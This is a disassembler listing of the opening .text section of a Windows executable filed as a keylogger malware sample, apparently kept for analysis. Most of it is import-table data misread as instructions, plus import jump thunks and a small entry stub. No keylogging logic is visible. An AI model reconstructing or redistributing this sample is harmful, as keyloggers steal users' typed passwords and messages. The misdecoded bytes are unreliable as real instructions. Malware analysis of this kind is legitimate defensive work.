
malware_samples/keylogger/3c4444c8339f2b4c04931a379daf9d041854b168e45f949515f90b124821d626.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	07                   	pop    %es
  401001:	05 a2 72 86 93       	add    $0x938672a2,%eax
  401006:	a3 72 f9 09 a3       	mov    %eax,0xa309f972
  40100b:	72 31                	jb     0x40103e
  40100d:	68 a4 72 29 19       	push   $0x192972a4
  401012:	a2 72 9b 6a a2       	mov    %al,0xa26a9b72
  401017:	72 62                	jb     0x40107b
  401019:	72 a4                	jb     0x400fbf
  40101b:	72 ba                	jb     0x400fd7
  40101d:	02 a3 72 c3 9f a1    	add    -0x5e603c8e(%ebx),%ah
  401023:	72 41                	jb     0x401066
  401025:	09 a3 72 76 6a a2    	or     %esp,-0x5d95898e(%ebx)
  40102b:	72 e5                	jb     0x401012
  40102d:	76 a2                	jbe    0x400fd1
  40102f:	72 17                	jb     0x401048
  401031:	1b a1 72 3a c3 a0    	sbb    -0x5f3cc58e(%ecx),%esp
  401037:	72 74                	jb     0x4010ad
  401039:	a2 a1 72 6e 02       	mov    %al,0x26e72a1
  40103e:	a3 72 35 db a1       	mov    %eax,0xa1db3572
  401043:	72 48                	jb     0x40108d
  401045:	4a                   	dec    %edx
  401046:	a2 72 91 41 a1       	mov    %al,0xa1419172
  40104b:	72 9d                	jb     0x400fea
  40104d:	49                   	dec    %ecx
  40104e:	a2 72 f1 9f a1       	mov    %al,0xa19ff172
  401053:	72 06                	jb     0x40105b
  401055:	03 a3 72 08 a0 a1    	add    -0x5e5ff78e(%ebx),%esp
  40105b:	72 06                	jb     0x401063
  40105d:	04 a3                	add    $0xa3,%al
  40105f:	72 f7                	jb     0x401058
  401061:	e0 a0                	loopne 0x401003
  401063:	72 21                	jb     0x401086
  401065:	76 a2                	jbe    0x401009
  401067:	72 ee                	jb     0x401057
  401069:	94                   	xchg   %eax,%esp
  40106a:	a3 72 2f 70 a2       	mov    %eax,0xa2702f72
  40106f:	72 ea                	jb     0x40105b
  401071:	62 a3 72 fb 7d a2    	bound  %esp,-0x5d82048e(%ebx)
  401077:	72 7d                	jb     0x4010f6
  401079:	41                   	inc    %ecx
  40107a:	a1 72 74 9b a0       	mov    0xa09b7472,%eax
  40107f:	72 de                	jb     0x40105f
  401081:	56                   	push   %esi
  401082:	a2 72 96 95 a2       	mov    %al,0xa2959672
  401087:	72 41                	jb     0x4010ca
  401089:	5d                   	pop    %ebp
  40108a:	a1 72 fd a0 94       	mov    0x94a0fd72,%eax
  40108f:	72 f6                	jb     0x401087
  401091:	09 a3 72 18 96 a2    	or     %esp,-0x5d69e78e(%ebx)
  401097:	72 25                	jb     0x4010be
  401099:	8b a4 72 9b 05 a2 72 	mov    0x72a2059b(%edx,%esi,2),%esp
  4010a0:	87 9b a0 72 69 ce    	xchg   %ebx,-0x31968d60(%ebx)
  4010a6:	a0 72 dc 19 a2       	mov    0xa219dc72,%al
  4010ab:	72 93                	jb     0x401040
  4010ad:	95                   	xchg   %eax,%ebp
  4010ae:	a3 72 85 9a a0       	mov    %eax,0xa09a8572
  4010b3:	72 df                	jb     0x401094
  4010b5:	47                   	inc    %edi
  4010b6:	a2 72 1d bf a0       	mov    %al,0xa0bf1d72
  4010bb:	72 89                	jb     0x401046
  4010bd:	06                   	push   %es
  4010be:	a3 72 ba 03 a3       	mov    %eax,0xa303ba72
  4010c3:	72 56                	jb     0x40111b
  4010c5:	0f a2                	cpuid
  4010c7:	72 13                	jb     0x4010dc
  4010c9:	75 a4                	jne    0x40106f
  4010cb:	72 48                	jb     0x401115
  4010cd:	19 a2 72 7d 69 a2    	sbb    %esp,-0x5d96828e(%edx)
  4010d3:	72 99                	jb     0x40106e
  4010d5:	de a1 72 f7 53 a1    	fisubs -0x5eac088e(%ecx)
  4010db:	72 2b                	jb     0x401108
  4010dd:	94                   	xchg   %eax,%esp
  4010de:	a3 72 67 e8 a0       	mov    %eax,0xa0e86772
  4010e3:	72 10                	jb     0x4010f5
  4010e5:	3d a1 72 37 a2       	cmp    $0xa23772a1,%eax
  4010ea:	a1 72 75 42 a1       	mov    0xa1427572,%eax
  4010ef:	72 18                	jb     0x401109
  4010f1:	56                   	push   %esi
  4010f2:	a2 72 ea 10 a2       	mov    %al,0xa210ea72
  4010f7:	72 3a                	jb     0x401133
  4010f9:	03 a3 72 3a 04 a3    	add    -0x5cfbc58e(%ebx),%esp
  4010ff:	72 4a                	jb     0x40114b
  401101:	6c                   	insb   (%dx),%es:(%edi)
  401102:	a2 72 e3 da a1       	mov    %al,0xa1dae372
  401107:	72 01                	jb     0x40110a
  401109:	6c                   	insb   (%dx),%es:(%edi)
  40110a:	a2 72 6e 03 a3       	mov    %al,0xa3036e72
  40110f:	72 a9                	jb     0x4010ba
  401111:	fd                   	std
  401112:	a2 72 a4 35 94       	mov    %al,0x9435a472
  401117:	72 2f                	jb     0x401148
  401119:	4e                   	dec    %esi
  40111a:	a2 72 b9 22 a1       	mov    %al,0xa122b972
  40111f:	72 f6                	jb     0x401117
  401121:	6d                   	insl   (%dx),%es:(%edi)
  401122:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401123:	72 d7                	jb     0x4010fc
  401125:	a3 94 72 fb 22       	mov    %eax,0x22fb7294
  40112a:	a1 72 b8 6b a4       	mov    0xa46bb872,%eax
  40112f:	72 ad                	jb     0x4010de
  401131:	6d                   	insl   (%dx),%es:(%edi)
  401132:	a2 72 c0 92 a3       	mov    %al,0xa392c072
  401137:	72 30                	jb     0x401169
  401139:	6c                   	insb   (%dx),%es:(%edi)
  40113a:	a2 72 ed 5d a4       	mov    %al,0xa45ded72
  40113f:	72 9d                	jb     0x4010de
  401141:	1b a1 72 50 1c a1    	sbb    -0x5ee3af8e(%ecx),%esp
  401147:	72 ed                	jb     0x401136
  401149:	ee                   	out    %al,(%dx)
  40114a:	a2 72 93 1c a1       	mov    %al,0xa11c9372
  40114f:	72 5a                	jb     0x4011ab
  401151:	1b a1 72 44 96 a3    	sbb    -0x5c69bb8e(%ecx),%esp
  401157:	72 d6                	jb     0x40112f
  401159:	1c a1                	sbb    $0xa1,%al
  40115b:	72 11                	jb     0x40116e
  40115d:	dd a2 72 af 9f a1    	frstor -0x5e60508e(%edx)
  401163:	72 ec                	jb     0x401151
  401165:	6b a2 72 5a 32 a1 72 	imul   $0x72,-0x5ecda58e(%edx),%esp
  40116c:	00 00                	add    %al,(%eax)
  40116e:	00 00                	add    %al,(%eax)
  401170:	05 00 08 00 f7       	add    $0xf7000800,%eax
  401175:	3c 40                	cmp    $0x40,%al
  401177:	00 00                	add    %al,(%eax)
  401179:	00 00                	add    %al,(%eax)
  40117b:	00 fe                	add    %bh,%dh
  40117d:	3c 40                	cmp    $0x40,%al
  40117f:	00 2f                	add    %ch,(%edi)
  401181:	00 14 00             	add    %dl,(%eax,%eax,1)
  401184:	70 42                	jo     0x4011c8
  401186:	40                   	inc    %eax
  401187:	00 b5 42 40 00 77    	add    %dh,0x77004042(%ebp)
  40118d:	42                   	inc    %edx
  40118e:	40                   	inc    %eax
  40118f:	00 00                	add    %al,(%eax)
  401191:	00 00                	add    %al,(%eax)
  401193:	00 98 11 40 00 20    	add    %bl,0x20004011(%eax)
  401199:	00 00                	add    %al,(%eax)
  40119b:	00 9a 3d 40 00 b9    	add    %bl,-0x46ffbfc3(%edx)
  4011a1:	3d 40 00 c8 3d       	cmp    $0x3dc80040,%eax
  4011a6:	40                   	inc    %eax
  4011a7:	00 04 3e             	add    %al,(%esi,%edi,1)
  4011aa:	40                   	inc    %eax
  4011ab:	00 12                	add    %dl,(%edx)
  4011ad:	3e 40                	ds inc %eax
  4011af:	00 20                	add    %ah,(%eax)
  4011b1:	3e 40                	ds inc %eax
  4011b3:	00 2e                	add    %ch,(%esi)
  4011b5:	3e 40                	ds inc %eax
  4011b7:	00 70 3e             	add    %dh,0x3e(%eax)
  4011ba:	40                   	inc    %eax
  4011bb:	00 81 3e 40 00 f2    	add    %al,-0xdffbfc2(%ecx)
  4011c1:	3e 40                	ds inc %eax
  4011c3:	00 03                	add    %al,(%ebx)
  4011c5:	3f                   	aas
  4011c6:	40                   	inc    %eax
  4011c7:	00 89 3f 40 00 9a    	add    %cl,-0x65ffbfc1(%ecx)
  4011cd:	3f                   	aas
  4011ce:	40                   	inc    %eax
  4011cf:	00 dc                	add    %bl,%ah
  4011d1:	3f                   	aas
  4011d2:	40                   	inc    %eax
  4011d3:	00 f0                	add    %dh,%al
  4011d5:	3f                   	aas
  4011d6:	40                   	inc    %eax
  4011d7:	00 74 40 40          	add    %dh,0x40(%eax,%eax,2)
  4011db:	00 81 40 40 00 94    	add    %al,-0x6bffbfc0(%ecx)
  4011e1:	40                   	inc    %eax
  4011e2:	40                   	inc    %eax
  4011e3:	00 a9 40 40 00 25    	add    %ch,0x25004040(%ecx)
  4011e9:	41                   	inc    %ecx
  4011ea:	40                   	inc    %eax
  4011eb:	00 c6                	add    %al,%dh
  4011ed:	41                   	inc    %ecx
  4011ee:	40                   	inc    %eax
  4011ef:	00 d3                	add    %dl,%bl
  4011f1:	41                   	inc    %ecx
  4011f2:	40                   	inc    %eax
  4011f3:	00 e0                	add    %ah,%al
  4011f5:	41                   	inc    %ecx
  4011f6:	40                   	inc    %eax
  4011f7:	00 e0                	add    %ah,%al
  4011f9:	41                   	inc    %ecx
  4011fa:	40                   	inc    %eax
  4011fb:	00 e5                	add    %ah,%ch
  4011fd:	41                   	inc    %ecx
  4011fe:	40                   	inc    %eax
  4011ff:	00 f8                	add    %bh,%al
  401201:	41                   	inc    %ecx
  401202:	40                   	inc    %eax
  401203:	00 20                	add    %ah,(%eax)
  401205:	42                   	inc    %edx
  401206:	40                   	inc    %eax
  401207:	00 20                	add    %ah,(%eax)
  401209:	42                   	inc    %edx
  40120a:	40                   	inc    %eax
  40120b:	00 48 42             	add    %cl,0x42(%eax)
  40120e:	40                   	inc    %eax
  40120f:	00 48 42             	add    %cl,0x42(%eax)
  401212:	40                   	inc    %eax
  401213:	00 70 42             	add    %dh,0x42(%eax)
  401216:	40                   	inc    %eax
  401217:	00 70 42             	add    %dh,0x42(%eax)
  40121a:	40                   	inc    %eax
  40121b:	00 00                	add    %al,(%eax)
  40121d:	00 00                	add    %al,(%eax)
  40121f:	00 0e                	add    %cl,(%esi)
  401221:	00 08                	add    %cl,(%eax)
  401223:	00 00                	add    %al,(%eax)
  401225:	00 00                	add    %al,(%eax)
  401227:	00 ac 45 40 00 85 45 	add    %ch,0x45850040(%ebp,%eax,2)
  40122e:	40                   	inc    %eax
  40122f:	00 1e                	add    %bl,(%esi)
  401231:	00 10                	add    %dl,(%eax)
  401233:	00 00                	add    %al,(%eax)
  401235:	00 00                	add    %al,(%eax)
  401237:	00 45 47             	add    %al,0x47(%ebp)
  40123a:	40                   	inc    %eax
  40123b:	00 23                	add    %ah,(%ebx)
  40123d:	47                   	inc    %edi
  40123e:	40                   	inc    %eax
  40123f:	00 48 12             	add    %cl,0x12(%eax)
  401242:	40                   	inc    %eax
  401243:	00 00                	add    %al,(%eax)
  401245:	00 00                	add    %al,(%eax)
  401247:	00 01                	add    %al,(%ecx)
  401249:	00 00                	add    %al,(%eax)
  40124b:	00 01                	add    %al,(%ecx)
  40124d:	00 00                	add    %al,(%eax)
  40124f:	00 10                	add    %dl,(%eax)
  401251:	47                   	inc    %edi
  401252:	40                   	inc    %eax
  401253:	00 00                	add    %al,(%eax)
  401255:	00 00                	add    %al,(%eax)
  401257:	00 27                	add    %ah,(%edi)
  401259:	00 14 00             	add    %dl,(%eax,%eax,1)
  40125c:	a8 53                	test   $0x53,%al
  40125e:	40                   	inc    %eax
  40125f:	00 04 54             	add    %al,(%esp,%edx,2)
  401262:	40                   	inc    %eax
  401263:	00 b0 53 40 00 00    	add    %dh,0x4053(%eax)
  401269:	00 00                	add    %al,(%eax)
  40126b:	00 70 12             	add    %dh,0x12(%eax)
  40126e:	40                   	inc    %eax
  40126f:	00 24 00             	add    %ah,(%eax,%eax,1)
  401272:	00 00                	add    %al,(%eax)
  401274:	c5 47 40             	lds    0x40(%edi),%eax
  401277:	00 cc                	add    %cl,%ah
  401279:	47                   	inc    %edi
  40127a:	40                   	inc    %eax
  40127b:	00 db                	add    %bl,%bl
  40127d:	47                   	inc    %edi
  40127e:	40                   	inc    %eax
  40127f:	00 b3 48 40 00 50    	add    %dh,0x50004048(%ebx)
  401285:	49                   	dec    %ecx
  401286:	40                   	inc    %eax
  401287:	00 92 49 40 00 4f    	add    %dl,0x4f004049(%edx)
  40128d:	4a                   	dec    %edx
  40128e:	40                   	inc    %eax
  40128f:	00 83 4a 40 00 d9    	add    %al,-0x26ffbfb6(%ebx)
  401295:	4a                   	dec    %edx
  401296:	40                   	inc    %eax
  401297:	00 49 4b             	add    %cl,0x4b(%ecx)
  40129a:	40                   	inc    %eax
  40129b:	00 dd                	add    %bl,%ch
  40129d:	4b                   	dec    %ebx
  40129e:	40                   	inc    %eax
  40129f:	00 f3                	add    %dh,%bl
  4012a1:	4b                   	dec    %ebx
  4012a2:	40                   	inc    %eax
  4012a3:	00 09                	add    %cl,(%ecx)
  4012a5:	4c                   	dec    %esp
  4012a6:	40                   	inc    %eax
  4012a7:	00 1f                	add    %bl,(%edi)
  4012a9:	4c                   	dec    %esp
  4012aa:	40                   	inc    %eax
  4012ab:	00 35 4c 40 00 56    	add    %dh,0x5600404c
  4012b1:	4c                   	dec    %esp
  4012b2:	40                   	inc    %eax
  4012b3:	00 d5                	add    %dl,%ch
  4012b5:	4c                   	dec    %esp
  4012b6:	40                   	inc    %eax
  4012b7:	00 04 4d 40 00 46 4d 	add    %al,0x4d460040(,%ecx,2)
  4012be:	40                   	inc    %eax
  4012bf:	00 ba 4d 40 00 84    	add    %bh,-0x7bffbfb3(%edx)
  4012c5:	4e                   	dec    %esi
  4012c6:	40                   	inc    %eax
  4012c7:	00 e3                	add    %ah,%bl
  4012c9:	4e                   	dec    %esi
  4012ca:	40                   	inc    %eax
  4012cb:	00 09                	add    %cl,(%ecx)
  4012cd:	4f                   	dec    %edi
  4012ce:	40                   	inc    %eax
  4012cf:	00 88 4f 40 00 38    	add    %cl,0x3800404f(%eax)
  4012d5:	50                   	push   %eax
  4012d6:	40                   	inc    %eax
  4012d7:	00 7a 50             	add    %bh,0x50(%edx)
  4012da:	40                   	inc    %eax
  4012db:	00 ee                	add    %ch,%dh
  4012dd:	50                   	push   %eax
  4012de:	40                   	inc    %eax
  4012df:	00 b8 51 40 00 17    	add    %bh,0x17004051(%eax)
  4012e5:	52                   	push   %edx
  4012e6:	40                   	inc    %eax
  4012e7:	00 17                	add    %dl,(%edi)
  4012e9:	52                   	push   %edx
  4012ea:	40                   	inc    %eax
  4012eb:	00 2d 52 40 00 43    	add    %ch,0x43004052
  4012f1:	52                   	push   %edx
  4012f2:	40                   	inc    %eax
  4012f3:	00 59 52             	add    %bl,0x52(%ecx)
  4012f6:	40                   	inc    %eax
  4012f7:	00 5e 52             	add    %bl,0x52(%esi)
  4012fa:	40                   	inc    %eax
  4012fb:	00 a1 53 40 00 a1    	add    %ah,-0x5effbfad(%ecx)
  401301:	53                   	push   %ebx
  401302:	40                   	inc    %eax
	...
  40130b:	00 00                	add    %al,(%eax)
  40130d:	00 f0                	add    %dh,%al
  40130f:	3f                   	aas
  401310:	00 00                	add    %al,(%eax)
  401312:	00 00                	add    %al,(%eax)
  401314:	00 00                	add    %al,(%eax)
  401316:	3e 40                	ds inc %eax
  401318:	27                   	daa
  401319:	00 14 00             	add    %dl,(%eax,%eax,1)
  40131c:	aa                   	stos   %al,%es:(%edi)
  40131d:	59                   	pop    %ecx
  40131e:	40                   	inc    %eax
  40131f:	00 73 5a             	add    %dh,0x5a(%ebx)
  401322:	40                   	inc    %eax
  401323:	00 b4 59 40 00 00 00 	add    %dh,0x40(%ecx,%ebx,2)
  40132a:	00 00                	add    %al,(%eax)
  40132c:	30 13                	xor    %dl,(%ebx)
  40132e:	40                   	inc    %eax
  40132f:	00 08                	add    %cl,(%eax)
  401331:	00 00                	add    %al,(%eax)
  401333:	00 b5 54 40 00 bc    	add    %dh,-0x43ffbfac(%ebp)
  401339:	54                   	push   %esp
  40133a:	40                   	inc    %eax
  40133b:	00 cb                	add    %cl,%bl
  40133d:	54                   	push   %esp
  40133e:	40                   	inc    %eax
  40133f:	00 b0 56 40 00 a0    	add    %dh,-0x5fffbfaa(%eax)
  401345:	57                   	push   %edi
  401346:	40                   	inc    %eax
  401347:	00 b7 57 40 00 f5    	add    %dh,-0xaffbfa9(%edi)
  40134d:	58                   	pop    %eax
  40134e:	40                   	inc    %eax
  40134f:	00 a3 59 40 00 00    	add    %ah,0x4059(%ebx)
  401355:	00 00                	add    %al,(%eax)
  401357:	00 2e                	add    %ch,(%esi)
  401359:	00 14 00             	add    %dl,(%eax,%eax,1)
  40135c:	00 00                	add    %al,(%eax)
  40135e:	00 00                	add    %al,(%eax)
  401360:	28 5f 40             	sub    %bl,0x40(%edi)
  401363:	00 01                	add    %al,(%ecx)
  401365:	5f                   	pop    %edi
  401366:	40                   	inc    %eax
  401367:	00 00                	add    %al,(%eax)
  401369:	00 00                	add    %al,(%eax)
  40136b:	00 70 13             	add    %dh,0x13(%eax)
  40136e:	40                   	inc    %eax
  40136f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  401372:	00 00                	add    %al,(%eax)
  401374:	ee                   	out    %al,(%dx)
  401375:	5a                   	pop    %edx
  401376:	40                   	inc    %eax
  401377:	00 fe                	add    %bh,%dh
  401379:	5a                   	pop    %edx
  40137a:	40                   	inc    %eax
  40137b:	00 0d 5b 40 00 21    	add    %cl,0x2100405b
  401381:	5c                   	pop    %esp
  401382:	40                   	inc    %eax
  401383:	00 4c 5c 40          	add    %cl,0x40(%esp,%ebx,2)
  401387:	00 59 5c             	add    %bl,0x5c(%ecx)
  40138a:	40                   	inc    %eax
  40138b:	00 84 5c 40 00 91 5c 	add    %al,0x5c910040(%esp,%ebx,2)
  401392:	40                   	inc    %eax
  401393:	00 bc 5c 40 00 c9 5c 	add    %bh,0x5cc90040(%esp,%ebx,2)
  40139a:	40                   	inc    %eax
  40139b:	00 dd                	add    %bl,%ch
  40139d:	5d                   	pop    %ebp
  40139e:	40                   	inc    %eax
  40139f:	00 fa                	add    %bh,%dl
  4013a1:	5e                   	pop    %esi
  4013a2:	40                   	inc    %eax
  4013a3:	00 00                	add    %al,(%eax)
  4013a5:	00 00                	add    %al,(%eax)
  4013a7:	00 05 00 08 00 e8    	add    %al,0xe8000800
  4013ad:	8d 40 00             	lea    0x0(%eax),%eax
  4013b0:	00 00                	add    %al,(%eax)
  4013b2:	00 00                	add    %al,(%eax)
  4013b4:	ef                   	out    %eax,(%dx)
  4013b5:	8d 40 00             	lea    0x0(%eax),%eax
  4013b8:	05 00 08 00 77       	add    $0x77000800,%eax
  4013bd:	91                   	xchg   %eax,%ecx
  4013be:	40                   	inc    %eax
  4013bf:	00 00                	add    %al,(%eax)
  4013c1:	00 00                	add    %al,(%eax)
  4013c3:	00 7e 91             	add    %bh,-0x6f(%esi)
  4013c6:	40                   	inc    %eax
  4013c7:	00 25 00 14 00 d4    	add    %ah,0xd4001400
  4013cd:	95                   	xchg   %eax,%ebp
  4013ce:	40                   	inc    %eax
  4013cf:	00 00                	add    %al,(%eax)
  4013d1:	00 00                	add    %al,(%eax)
  4013d3:	00 db                	add    %bl,%bl
  4013d5:	95                   	xchg   %eax,%ebp
  4013d6:	40                   	inc    %eax
  4013d7:	00 00                	add    %al,(%eax)
  4013d9:	00 00                	add    %al,(%eax)
  4013db:	00 e0                	add    %ah,%al
  4013dd:	13 40 00             	adc    0x0(%eax),%eax
  4013e0:	0f 00 00             	sldt   (%eax)
  4013e3:	00 15 92 40 00 1c    	add    %dl,0x1c004092
  4013e9:	92                   	xchg   %eax,%edx
  4013ea:	40                   	inc    %eax
  4013eb:	00 2b                	add    %ch,(%ebx)
  4013ed:	92                   	xchg   %eax,%edx
  4013ee:	40                   	inc    %eax
  4013ef:	00 d0                	add    %dl,%al
  4013f1:	92                   	xchg   %eax,%edx
  4013f2:	40                   	inc    %eax
  4013f3:	00 0c 93             	add    %cl,(%ebx,%edx,4)
  4013f6:	40                   	inc    %eax
  4013f7:	00 7a 93             	add    %bh,-0x6d(%edx)
  4013fa:	40                   	inc    %eax
  4013fb:	00 af 94 40 00 08    	add    %ch,0x8004094(%edi)
  401401:	95                   	xchg   %eax,%ebp
  401402:	40                   	inc    %eax
  401403:	00 15 95 40 00 8b    	add    %dl,0x8b004095
  401409:	95                   	xchg   %eax,%ebp
  40140a:	40                   	inc    %eax
  40140b:	00 8b 95 40 00 8b    	add    %cl,-0x74ffbf6b(%ebx)
  401411:	95                   	xchg   %eax,%ebp
  401412:	40                   	inc    %eax
  401413:	00 a1 95 40 00 b7    	add    %ah,-0x48ffbf6b(%ecx)
  401419:	95                   	xchg   %eax,%ebp
  40141a:	40                   	inc    %eax
  40141b:	00 cd                	add    %cl,%ch
  40141d:	95                   	xchg   %eax,%ebp
  40141e:	40                   	inc    %eax
	...
  401427:	00 26                	add    %ah,(%esi)
  401429:	00 14 00             	add    %dl,(%eax,%eax,1)
  40142c:	00 00                	add    %al,(%eax)
  40142e:	00 00                	add    %al,(%eax)
  401430:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401431:	98                   	cwtl
  401432:	40                   	inc    %eax
  401433:	00 99 98 40 00 00    	add    %bl,0x4098(%ecx)
  401439:	00 00                	add    %al,(%eax)
  40143b:	00 40 14             	add    %al,0x14(%eax)
  40143e:	40                   	inc    %eax
  40143f:	00 15 00 00 00 6e    	add    %dl,0x6e000000
  401445:	96                   	xchg   %eax,%esi
  401446:	40                   	inc    %eax
  401447:	00 8f 96 40 00 9e    	add    %cl,-0x61ffbf6a(%edi)
  40144d:	96                   	xchg   %eax,%esi
  40144e:	40                   	inc    %eax
  40144f:	00 ac 96 40 00 d7 96 	add    %ch,-0x6928ffc0(%esi,%edx,4)
  401456:	40                   	inc    %eax
  401457:	00 e8                	add    %ch,%al
  401459:	96                   	xchg   %eax,%esi
  40145a:	40                   	inc    %eax
  40145b:	00 41 97             	add    %al,-0x69(%ecx)
  40145e:	40                   	inc    %eax
  40145f:	00 52 97             	add    %dl,-0x69(%edx)
  401462:	40                   	inc    %eax
  401463:	00 80 97 40 00 8e    	add    %al,-0x71ffbf69(%eax)
  401469:	97                   	xchg   %eax,%edi
  40146a:	40                   	inc    %eax
  40146b:	00 9e 97 40 00 cf    	add    %bl,-0x30ffbf69(%esi)
  401471:	97                   	xchg   %eax,%edi
  401472:	40                   	inc    %eax
  401473:	00 e3                	add    %ah,%bl
  401475:	97                   	xchg   %eax,%edi
  401476:	40                   	inc    %eax
  401477:	00 f7                	add    %dh,%bh
  401479:	97                   	xchg   %eax,%edi
  40147a:	40                   	inc    %eax
  40147b:	00 11                	add    %dl,(%ecx)
  40147d:	98                   	cwtl
  40147e:	40                   	inc    %eax
  40147f:	00 22                	add    %ah,(%edx)
  401481:	98                   	cwtl
  401482:	40                   	inc    %eax
  401483:	00 66 98             	add    %ah,-0x68(%esi)
  401486:	40                   	inc    %eax
  401487:	00 7c 98 40          	add    %bh,0x40(%eax,%ebx,4)
  40148b:	00 7c 98 40          	add    %bh,0x40(%eax,%ebx,4)
  40148f:	00 92 98 40 00 92    	add    %dl,-0x6dffbf68(%edx)
  401495:	98                   	cwtl
  401496:	40                   	inc    %eax
	...
  40149f:	00 ff                	add    %bh,%bh
  4014a1:	25 70 10 40 00       	and    $0x401070,%eax
  4014a6:	ff 25 b4 10 40 00    	jmp    *0x4010b4
  4014ac:	ff 25 c8 10 40 00    	jmp    *0x4010c8
  4014b2:	ff 25 54 10 40 00    	jmp    *0x401054
  4014b8:	ff 25 3c 10 40 00    	jmp    *0x40103c
  4014be:	ff 25 f8 10 40 00    	jmp    *0x4010f8
  4014c4:	ff 25 1c 10 40 00    	jmp    *0x40101c
  4014ca:	ff 25 10 11 40 00    	jmp    *0x401110
  4014d0:	ff 25 5c 10 40 00    	jmp    *0x40105c
  4014d6:	ff 25 0c 11 40 00    	jmp    *0x40110c
  4014dc:	ff 25 fc 10 40 00    	jmp    *0x4010fc
  4014e2:	ff 25 c0 10 40 00    	jmp    *0x4010c0
  4014e8:	ff 25 90 10 40 00    	jmp    *0x401090
  4014ee:	ff 25 bc 10 40 00    	jmp    *0x4010bc
  4014f4:	ff 25 24 10 40 00    	jmp    *0x401024
  4014fa:	ff 25 08 10 40 00    	jmp    *0x401008
  401500:	ff 25 34 11 40 00    	jmp    *0x401134
  401506:	ff 25 04 10 40 00    	jmp    *0x401004
  40150c:	ff 25 5c 11 40 00    	jmp    *0x40115c
  401512:	ff 25 dc 10 40 00    	jmp    *0x4010dc
  401518:	ff 25 68 10 40 00    	jmp    *0x401068
  40151e:	ff 25 ac 10 40 00    	jmp    *0x4010ac
  401524:	ff 25 54 11 40 00    	jmp    *0x401154
  40152a:	ff 25 48 11 40 00    	jmp    *0x401148
  401530:	ff 25 8c 10 40 00    	jmp    *0x40108c
  401536:	ff 25 d4 10 40 00    	jmp    *0x4010d4
  40153c:	ff 25 18 11 40 00    	jmp    *0x401118
  401542:	ff 25 98 10 40 00    	jmp    *0x401098
  401548:	ff 25 58 10 40 00    	jmp    *0x401058
  40154e:	ff 25 04 11 40 00    	jmp    *0x401104
  401554:	ff 25 c4 10 40 00    	jmp    *0x4010c4
  40155a:	ff 25 cc 10 40 00    	jmp    *0x4010cc
  401560:	ff 25 60 10 40 00    	jmp    *0x401060
  401566:	ff 25 a8 10 40 00    	jmp    *0x4010a8
  40156c:	ff 25 3c 11 40 00    	jmp    *0x40113c
  401572:	ff 25 88 10 40 00    	jmp    *0x401088
  401578:	ff 25 58 11 40 00    	jmp    *0x401158
  40157e:	ff 25 4c 11 40 00    	jmp    *0x40114c
  401584:	ff 25 28 11 40 00    	jmp    *0x401128
  40158a:	ff 25 44 11 40 00    	jmp    *0x401144
  401590:	ff 25 30 10 40 00    	jmp    *0x401030
  401596:	ff 25 50 11 40 00    	jmp    *0x401150
  40159c:	ff 25 1c 11 40 00    	jmp    *0x40111c
  4015a2:	ff 25 40 11 40 00    	jmp    *0x401140
  4015a8:	ff 25 e0 10 40 00    	jmp    *0x4010e0
  4015ae:	ff 25 20 10 40 00    	jmp    *0x401020
  4015b4:	ff 25 68 11 40 00    	jmp    *0x401168
  4015ba:	ff 25 9c 10 40 00    	jmp    *0x40109c
  4015c0:	ff 25 a4 10 40 00    	jmp    *0x4010a4
  4015c6:	ff 25 84 10 40 00    	jmp    *0x401084
  4015cc:	ff 25 64 10 40 00    	jmp    *0x401064
  4015d2:	ff 25 6c 10 40 00    	jmp    *0x40106c
  4015d8:	ff 25 00 10 40 00    	jmp    *0x401000
  4015de:	ff 25 50 10 40 00    	jmp    *0x401050
  4015e4:	ff 25 f4 10 40 00    	jmp    *0x4010f4
  4015ea:	ff 25 44 10 40 00    	jmp    *0x401044
  4015f0:	ff 25 48 10 40 00    	jmp    *0x401048
  4015f6:	ff 25 78 10 40 00    	jmp    *0x401078
  4015fc:	ff 25 80 10 40 00    	jmp    *0x401080
  401602:	ff 25 f0 10 40 00    	jmp    *0x4010f0
  401608:	ff 25 74 10 40 00    	jmp    *0x401074
  40160e:	ff 25 e4 10 40 00    	jmp    *0x4010e4
  401614:	ff 25 ec 10 40 00    	jmp    *0x4010ec
  40161a:	ff 25 d8 10 40 00    	jmp    *0x4010d8
  401620:	ff 25 2c 11 40 00    	jmp    *0x40112c
  401626:	ff 25 30 11 40 00    	jmp    *0x401130
  40162c:	ff 25 d0 10 40 00    	jmp    *0x4010d0
  401632:	ff 25 2c 10 40 00    	jmp    *0x40102c
  401638:	ff 25 14 10 40 00    	jmp    *0x401014
  40163e:	ff 25 28 10 40 00    	jmp    *0x401028
  401644:	ff 25 08 11 40 00    	jmp    *0x401108
  40164a:	ff 25 b8 10 40 00    	jmp    *0x4010b8
  401650:	ff 25 34 10 40 00    	jmp    *0x401034
  401656:	ff 25 24 11 40 00    	jmp    *0x401124
  40165c:	ff 25 0c 10 40 00    	jmp    *0x40100c
  401662:	ff 25 4c 10 40 00    	jmp    *0x40104c
  401668:	ff 25 94 10 40 00    	jmp    *0x401094
  40166e:	ff 25 18 10 40 00    	jmp    *0x401018
  401674:	ff 25 64 11 40 00    	jmp    *0x401164
  40167a:	ff 25 20 11 40 00    	jmp    *0x401120
  401680:	ff 25 40 10 40 00    	jmp    *0x401040
  401686:	ff 25 10 10 40 00    	jmp    *0x401010
  40168c:	ff 25 38 11 40 00    	jmp    *0x401138
  401692:	ff 25 00 11 40 00    	jmp    *0x401100
  401698:	ff 25 60 11 40 00    	jmp    *0x401160
  40169e:	ff 25 38 10 40 00    	jmp    *0x401038
  4016a4:	ff 25 e8 10 40 00    	jmp    *0x4010e8
  4016aa:	ff 25 b0 10 40 00    	jmp    *0x4010b0
  4016b0:	ff 25 7c 10 40 00    	jmp    *0x40107c
  4016b6:	ff 25 a0 10 40 00    	jmp    *0x4010a0
  4016bc:	ff 25 14 11 40 00    	jmp    *0x401114
  4016c2:	00 00                	add    %al,(%eax)
  4016c4:	68 38 1d 40 00       	push   $0x401d38
  4016c9:	e8 ee ff ff ff       	call   0x4016bc
  4016ce:	00 00                	add    %al,(%eax)
  4016d0:	00 00                	add    %al,(%eax)
  4016d2:	00 00                	add    %al,(%eax)
  4016d4:	30 00                	xor    %al,(%eax)
  4016d6:	00 00                	add    %al,(%eax)
  4016d8:	50                   	push   %eax
  4016d9:	00 00                	add    %al,(%eax)
  4016db:	00 38                	add    %bh,(%eax)
  4016dd:	00 00                	add    %al,(%eax)
